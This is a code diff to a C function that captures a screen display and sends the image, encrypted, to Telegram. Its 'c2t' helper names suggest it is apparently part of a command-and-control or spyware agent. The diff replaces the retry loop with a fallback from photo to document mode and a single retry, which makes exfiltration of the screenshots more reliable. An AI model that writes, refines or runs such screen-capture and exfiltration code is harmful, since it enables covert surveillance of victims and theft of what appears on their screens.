@@ -307,29 +307,33 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
   if (retry_delay_ms == 0) retry_delay_ms = 500;
 
   int send_res = 0;
-  for (size_t attempt = 1; attempt <= attempts; ++attempt) {
-    send_res = send_as_photo
-                   ? telegram_send_encrypted_photo(image_data, image_size,
-                                                   nonce, mime_type, filename,
-                                                   &source)
-                   : telegram_send_encrypted_file(image_data, image_size,
-                                                  nonce, mime_type, filename,
-                                                  &source);
-    if (send_res) {
-      break;
+  if (send_as_photo) {
+    send_res = telegram_send_encrypted_photo(image_data, image_size, nonce,
+                                            mime_type, filename, &source);
+    if (!send_res) {
+      c2t_log_warning(
+          "screenshot",
+          "Photo delivery failed; falling back to document mode...");
+      send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
+                                             mime_type, filename, &source);
     }
-    if (attempt < attempts) {
-      c2t_log_warning("screenshot", "Delivery attempt %llu/%llu failed, retrying...",
-                      (unsigned long long)attempt, (unsigned long long)attempts);
+  } else {
+    send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
+                                           mime_type, filename, &source);
+  }
+
+  /* If transient network error and multiple attempts configured, retry once in document mode */
+  if (!send_res && attempts > 1) {
+    c2t_log_warning("screenshot", "Retrying delivery once...");
 #ifdef _WIN32
-      Sleep((DWORD)(retry_delay_ms * attempt));
+    Sleep((DWORD)retry_delay_ms);
 #else
-      size_t delay = retry_delay_ms * attempt;
-      struct timespec ts = {.tv_sec = (time_t)(delay / 1000),
-                            .tv_nsec = (long)(delay % 1000) * 1000000L};
-      nanosleep(&ts, nullptr);
+    struct timespec ts = {.tv_sec = (time_t)(retry_delay_ms / 1000),
+                          .tv_nsec = (long)(retry_delay_ms % 1000) * 1000000L};
+    nanosleep(&ts, nullptr);
 #endif
-    }
+    send_res = telegram_send_encrypted_file(image_data, image_size, nonce,
+                                           mime_type, filename, &source);
   }
 
   c2t_secure_zero(image_data, image_size);
@@ -340,10 +344,13 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
   if (send_res) {
     atomic_fetch_add_explicit(&total_captures, 1, memory_order_relaxed);
     atomic_fetch_add_explicit(&total_bytes, image_size, memory_order_relaxed);
-    c2t_log_info("screenshot", "Screenshot successfully delivered via encrypted stream (%llu bytes)", (unsigned long long)image_size);
+    c2t_log_info("screenshot",
+                 "Screenshot successfully delivered via encrypted stream (%llu "
+                 "bytes)",
+                 (unsigned long long)image_size);
     return 1;
   } else {
-    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram after %llu attempts", (unsigned long long)attempts);
+    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram");
     return 0;
   }
 }
